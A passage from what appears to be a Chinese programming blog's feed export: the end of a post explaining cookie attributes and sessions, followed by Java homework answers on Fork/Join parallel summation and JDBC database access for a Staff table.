<p>Set-Cookie：第一次访问，服务器响应给客户端<br>
Cookie：之后的访问，客户端发送给服务器</p>
<table>
<thead>
<tr>
<th>MIME</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr>
<td>name=value</td>
<td>cookie的键值对（必须）</td>
</tr>
<tr>
<td>expires</td>
<td>过期时间（设置了就存在磁盘，并不设置就在内存）</td>
</tr>
<tr>
<td>max-age</td>
<td>多久过期（秒</td>
</tr>
<tr>
<td>domain</td>
<td>对哪个域名生效</td>
</tr>
<tr>
<td>path</td>
<td>匹配的路径</td>
</tr>
<tr>
<td>secure</td>
<td>只有HTTPS连接菜发送cookie到服务器</td>
</tr>
<tr>
<td>httponly</td>
<td>不允许通过脚本document.cookie去更改这个值</td>
</tr>
</tbody>
</table>
<h4 id="session"><a class="markdownIt-Anchor" href="#session"></a> Session</h4>
<p><img src="https://s1.ax1x.com/2023/09/10/pPcOCo4.png" alt="Session创建、校验、销毁"></p>
]]></content>
      <categories>
        <category>网络安全</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>XSS注入</tag>
      </tags>
  </entry>
  <entry>
    <title>Java作业-13</title>
    <url>/2023/12/14/11-22-33/</url>
    <content><![CDATA[<p>java数据库操作</p>
<span id="more"></span>
<h2 id="如何定义一个forkjointaskrecursiveaction和recursivetask的区别是什么"><a class="markdownIt-Anchor" href="#如何定义一个forkjointaskrecursiveaction和recursivetask的区别是什么"></a> 如何定义一个ForkJoinTask?RecursiveAction和RecursiveTask的区别是什么?</h2>
<p>继承它的两个子类之一：RecursiveAction 或 RecursiveTask。</p>
<ul>
<li>
<p>RecursiveAction<br>
用于执行没有返回结果的任务。<br>
需要重写 compute() 方法来实现任务的逻辑。</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveAction</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRecursiveAction</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveAction</span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token keyword">void</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 任务逻辑</span>
        <span class="token comment">// 如果需要，分解任务并调用 invokeAll</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>RecursiveTask<br>
用于有返回结果的任务。<br>
需要重写 compute() 方法，但这次会返回一个结果。</p>
  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveTask</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">MyRecursiveTask</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Integer</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">Integer</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token comment">// 任务逻辑</span>
        <span class="token comment">// 如果需要，分解任务并调用 invokeAll</span>
        <span class="token comment">// 返回计算结果</span>
        <span class="token keyword">return</span> someResult<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li>
<p>返回值: RecursiveAction 不产生任何返回结果，而 RecursiveTask 用于计算需要返回结果的任务。</p>
</li>
<li>
<p>使用场景: 根据任务是否需要返回结果来选择。如果只是执行一些操作（如排序、打印等），而不需要结果，则使用 RecursiveAction。如果需要从任务中获取结果（如计算总和、寻找最大值等），则使用 RecursiveTask。</p>
</li>
</ul>
<h2 id="描述下面的jdbc接口driver-connection-statement和resultset"><a class="markdownIt-Anchor" href="#描述下面的jdbc接口driver-connection-statement和resultset"></a> 描述下面的JDBC接口:Driver、Connection、Statement和ResultSet</h2>
<ul>
<li>
<p>Driver<br>
Driver 接口是 JDBC 驱动程序的一部分，用于管理与特定数据库类型的连接。<br>
使用 JDBC 连接数据库时，首先需要加载并注册特定数据库的 JDBC 驱动。这通常通过调用 Class.forName() 方法实现。</p>
</li>
<li>
<p>Connection:<br>
Connection 接口代表数据库的一个连接。<br>
使用 DriverManager 获取 Connection 实例，需要提供数据库 URL、用户名和密码。<br>
Connection 用于管理事务（如提交或回滚）并创建执行 SQL 语句的 Statement 对象。</p>
</li>
<li>
<p>Statement:<br>
Statement 接口用于执行 SQL 语句并返回结果。<br>
它有几个子接口，如 PreparedStatement 和 CallableStatement，分别用于执行预编译 SQL 和调用存储过程。<br>
Statement 对象是通过 Connection 对象创建的。</p>
</li>
<li>
<p>ResultSet<br>
ResultSet 接口表示 SQL 查询的结果。<br>
它允许从结果集中逐行读取数据，并对数据进行操作。<br>
ResultSet 提供了多种方法来访问不同数据类型的列值。</p>
</li>
</ul>
<h2 id="如何加载一个jdbc-驱动程序-mysql-access-和oracle-的驱动程序类是什么"><a class="markdownIt-Anchor" href="#如何加载一个jdbc-驱动程序-mysql-access-和oracle-的驱动程序类是什么"></a> 如何加载一个JDBC 驱动程序? MySQL、Access 和Oracle 的驱动程序类是什么?</h2>
<p>在 JDBC 4.0 之前，通常使用 Class.forName() 方法来显式加载 JDBC 驱动程序。自 JDBC 4.0 起，大多数 JDBC 驱动程序使用 Java SE 服务提供者机制自动加载，因此通常不需要显式调用 Class.forName()。</p>
<ul>
<li>MySQL: com.mysql.jdbc.Driver 或 com.mysql.cj.jdbc.Driver（较新的版本）</li>
<li>Access: 由于没有官方 JDBC 驱动，通常使用第三方库如 UCanAccess (net.ucanaccess.jdbc.UcanaccessDriver)</li>
<li>Oracle: oracle.jdbc.driver.OracleDriver</li>
</ul>
<h2 id="如何创建一个数据库的连接-mysql-access-和-oracle-的url-是什么"><a class="markdownIt-Anchor" href="#如何创建一个数据库的连接-mysql-access-和-oracle-的url-是什么"></a> 如何创建一个数据库的连接? MySQL、Access 和 Oracle 的URL 是什么?</h2>
<p>使用 DriverManager.getConnection(url, username, password) 方法创建数据库连接。</p>
<ul>
<li>MySQL: “jdbc:mysql://host:port/databaseName”</li>
<li>Access: “jdbc:ucanaccess://path_to_database_file” （使用 UCanAccess 驱动）</li>
<li>Oracle: “jdbc:oracle:thin:@host:port:SID”</li>
</ul>
<h2 id="如何创建一个statement-对象如何执行一个sql语句"><a class="markdownIt-Anchor" href="#如何创建一个statement-对象如何执行一个sql语句"></a> 如何创建一个Statement 对象?如何执行一个SQL语句?</h2>
<ul>
<li>
<p>通过已经建立的 Connection 对象创建 Statement 对象。例如：<br>
<code>Statement stmt = conn.createStatement();</code></p>
</li>
<li>
<p>使用 Statement 对象执行 SQL 语句。例如：<br>
-执行查询：ResultSet rs = stmt.executeQuery(“SELECT * FROM table_name”);<br>
-执行更新：int rowsAffected = stmt.executeUpdate(“UPDATE table_name SET column_name = value”);</p>
</li>
</ul>
<h2 id="如何获取-resultset中的值"><a class="markdownIt-Anchor" href="#如何获取-resultset中的值"></a> 如何获取 ResultSet中的值?</h2>
<p>遍历 ResultSet 对象，并使用适当的 getter 方法获取列值。例如：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">while</span> <span class="token punctuation">(</span>rs<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token class-name">String</span> columnValue <span class="token operator">=</span> rs<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"column_name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">// 其他处理</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="并行求和使用-forkjoin-实现以下方法对一个线性表求和"><a class="markdownIt-Anchor" href="#并行求和使用-forkjoin-实现以下方法对一个线性表求和"></a> (并行求和)使用 Fork/Join 实现以下方法，对一个线性表求和</h2>
<p><code>public static double paralelSum(double[] Tist)</code><br>
编写一个测试程序，对一个大小为9000 000的double 值求和。</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">RecursiveTask</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span></span><span class="token class-name">ForkJoinPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Random</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SumTask</span> <span class="token keyword">extends</span> <span class="token class-name">RecursiveTask</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Double</span><span class="token punctuation">&gt;</span></span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> start<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">final</span> <span class="token keyword">int</span> end<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token keyword">int</span> <span class="token constant">THRESHOLD</span> <span class="token operator">=</span> <span class="token number">1000</span><span class="token punctuation">;</span> <span class="token comment">// 可调整的阈值</span>

    <span class="token keyword">public</span> <span class="token class-name">SumTask</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">,</span> <span class="token keyword">int</span> start<span class="token punctuation">,</span> <span class="token keyword">int</span> end<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>array <span class="token operator">=</span> array<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>start <span class="token operator">=</span> start<span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>end <span class="token operator">=</span> end<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token annotation punctuation">@Override</span>
    <span class="token keyword">protected</span> <span class="token class-name">Double</span> <span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start <span class="token operator">&lt;=</span> <span class="token constant">THRESHOLD</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token comment">// 直接计算</span>
            <span class="token keyword">double</span> sum <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> end<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                sum <span class="token operator">+=</span> array<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
            <span class="token keyword">return</span> sum<span class="token punctuation">;</span>
        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
            <span class="token comment">// 分解任务</span>
            <span class="token keyword">int</span> middle <span class="token operator">=</span> start <span class="token operator">+</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
            <span class="token class-name">SumTask</span> left <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SumTask</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> start<span class="token punctuation">,</span> middle<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token class-name">SumTask</span> right <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SumTask</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> middle<span class="token punctuation">,</span> end<span class="token punctuation">)</span><span class="token punctuation">;</span>
            left<span class="token punctuation">.</span><span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 异步执行</span>
            <span class="token keyword">double</span> rightResult <span class="token operator">=</span> right<span class="token punctuation">.</span><span class="token function">compute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 同步执行</span>
            <span class="token keyword">double</span> leftResult <span class="token operator">=</span> left<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 等待左侧任务完成</span>
            <span class="token keyword">return</span> leftResult <span class="token operator">+</span> rightResult<span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ParallelSum</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">double</span> <span class="token function">parallelSum</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token class-name">ForkJoinPool</span> pool <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ForkJoinPool</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">SumTask</span> task <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SumTask</span><span class="token punctuation">(</span>array<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> array<span class="token punctuation">.</span>length<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> pool<span class="token punctuation">.</span><span class="token function">invoke</span><span class="token punctuation">(</span>task<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">TestParallelSum</span> <span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token punctuation">]</span> array <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">double</span><span class="token punctuation">[</span><span class="token number">9000000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token class-name">Random</span> random <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Random</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> array<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            array<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> random<span class="token punctuation">.</span><span class="token function">nextDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>

        <span class="token keyword">double</span> sum <span class="token operator">=</span> <span class="token class-name">ParallelSum</span><span class="token punctuation">.</span><span class="token function">parallelSum</span><span class="token punctuation">(</span>array<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Sum: "</span> <span class="token operator">+</span> sum<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="访问并更新表-staff编写一个程序浏览-插和更新存储在一个数据库中的职员信息如图32-27a-所示-view-按钮用于显示具有指定-id-的记录-insert-按钮插入一条新的记录-update按钮更新一条指定id-的记录-按如下方式创建职工表-staff"><a class="markdownIt-Anchor" href="#访问并更新表-staff编写一个程序浏览-插和更新存储在一个数据库中的职员信息如图32-27a-所示-view-按钮用于显示具有指定-id-的记录-insert-按钮插入一条新的记录-update按钮更新一条指定id-的记录-按如下方式创建职工表-staff"></a> (访问并更新表 Staff)编写一个程序，浏览、插和更新存储在一个数据库中的职员信息，如图32-27a 所示。View 按钮用于显示具有指定 ID 的记录。Insert 按钮插入一条新的记录。Update按钮更新一条指定ID 的记录。按如下方式创建职工表 Staff</h2>
<p>Staff.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Staff</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> id<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getId</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setId</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>id <span class="token operator">=</span> id<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getLastName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> lastName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setLastName</span><span class="token punctuation">(</span><span class="token class-name">String</span> lastName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>lastName <span class="token operator">=</span> lastName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getFirstName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> firstName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setFirstName</span><span class="token punctuation">(</span><span class="token class-name">String</span> firstName<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>firstName <span class="token operator">=</span> firstName<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getMi</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> mi<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setMi</span><span class="token punctuation">(</span><span class="token class-name">String</span> mi<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>mi <span class="token operator">=</span> mi<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getAddress</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> address<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setAddress</span><span class="token punctuation">(</span><span class="token class-name">String</span> address<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>address <span class="token operator">=</span> address<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getCity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> city<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setCity</span><span class="token punctuation">(</span><span class="token class-name">String</span> city<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>city <span class="token operator">=</span> city<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getState</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> state<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setState</span><span class="token punctuation">(</span><span class="token class-name">String</span> state<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>state <span class="token operator">=</span> state<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getTelephone</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> telephone<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setTelephone</span><span class="token punctuation">(</span><span class="token class-name">String</span> telephone<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>telephone <span class="token operator">=</span> telephone<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">getEmail</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> email<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setEmail</span><span class="token punctuation">(</span><span class="token class-name">String</span> email<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>email <span class="token operator">=</span> email<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">private</span> <span class="token class-name">String</span> lastName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> firstName<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> mi<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> address<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> city<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> state<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> telephone<span class="token punctuation">;</span>
    <span class="token keyword">private</span> <span class="token class-name">String</span> email<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>StaffDao.java</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>example</span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">StaffDao</span> <span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token class-name">Connection</span> connection<span class="token punctuation">;</span>

    <span class="token keyword">public</span> <span class="token class-name">StaffDao</span><span class="token punctuation">(</span><span class="token class-name">String</span> url<span class="token punctuation">,</span> <span class="token class-name">String</span> user<span class="token punctuation">,</span> <span class="token class-name">String</span> password<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span><span class="token punctuation">,</span> <span class="token class-name">ClassNotFoundException</span> <span class="token punctuation">{</span>
        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.cj.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>connection <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token class-name">Staff</span> <span class="token function">findStaffById</span><span class="token punctuation">(</span><span class="token class-name">String</span> id<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT id, lastName, firstName, mi, address, city, state, telephone, email FROM staff WHERE id = ?;"</span><span class="token punctuation">;</span>
        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            preparedStatement<span class="token punctuation">.</span><span class="token function">setString</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
                    <span class="token keyword">return</span> <span class="token function">mapRowToStaff</span><span class="token punctuation">(</span>resultSet<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token punctuation">}</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">int</span> <span class="token function">insertStaff</span><span class="token punctuation">(</span><span class="token class-name">Staff</span> staff<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">SQLException</span> <span class="token punctuation">{</span>
        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"INSERT INTO staff (id, lastName, firstName, mi, address, city, state, telephone, email) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?);"</span><span class="token punctuation">;</span>
